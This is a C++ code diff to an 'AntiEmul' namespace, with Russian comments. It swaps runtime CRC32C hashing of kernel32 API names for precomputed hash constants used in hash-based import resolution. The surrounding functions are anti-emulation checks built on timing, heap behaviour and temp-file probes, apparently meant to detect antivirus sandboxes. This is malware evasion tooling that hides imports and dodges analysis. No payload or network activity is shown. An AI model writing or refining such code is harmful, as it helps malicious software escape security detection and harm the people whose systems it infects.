@@ -13,6 +13,13 @@
 
 namespace AntiEmul
 {
+    // ═══ Предвычисленные CRC32C-хеши ═══
+    static constexpr DWORD HASH_GetTickCount64       = 0x17ABCBE7;
+    static constexpr DWORD HASH_HeapCreate           = 0x1986F3A0;
+    static constexpr DWORD HASH_HeapDestroy          = 0x9903BCD3;
+    static constexpr DWORD HASH_GetTempPathW         = 0x9E55CDC6;
+    static constexpr DWORD HASH_GetFileAttributesW   = 0xA1D2727E;
+
     // Typedefs for dynamically resolved heap functions
     typedef HANDLE (WINAPI* pHeapAlloc)(HANDLE, DWORD, SIZE_T);
     typedef BOOL   (WINAPI* pHeapFree)(HANDLE, DWORD, LPCVOID);
@@ -29,7 +36,7 @@ namespace AntiEmul
 
         typedef ULONGLONG(WINAPI* pfnGetTickCount64)();
         auto pGetTickCount64 = (pfnGetTickCount64)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("GetTickCount64"));
+            hK32, HASH_GetTickCount64);
         if (!pGetTickCount64) return true;
 
         ULONGLONG t1 = pGetTickCount64();
@@ -61,8 +68,8 @@ namespace AntiEmul
         HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
         if (!hK32) return true;
 
-        auto fnHeapCreate  = (pHeapCreate)Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("HeapCreate"));
-        auto fnHeapDestroy = (pHeapDestroy)Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("HeapDestroy"));
+        auto fnHeapCreate  = (pHeapCreate)Api::GetProcByHashCrc(hK32, HASH_HeapCreate);
+        auto fnHeapDestroy = (pHeapDestroy)Api::GetProcByHashCrc(hK32, HASH_HeapDestroy);
         if (!fnHeapCreate || !fnHeapDestroy) return true;
 
         HANDLE heap = fnHeapCreate(0, 0, 0);
@@ -112,9 +119,9 @@ namespace AntiEmul
         typedef DWORD(WINAPI* pfnGetFileAttributesW)(LPCWSTR);
 
         auto fnGetTempPathW = (pfnGetTempPathW)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("GetTempPathW"));
+            hK32, HASH_GetTempPathW);
         auto fnGetFileAttributesW = (pfnGetFileAttributesW)Api::GetProcByHashCrc(
-            hK32, Crc32C::ConstHash("GetFileAttributesW"));
+            hK32, HASH_GetFileAttributesW);
 
         if (!fnGetTempPathW || !fnGetFileAttributesW) return true;
 
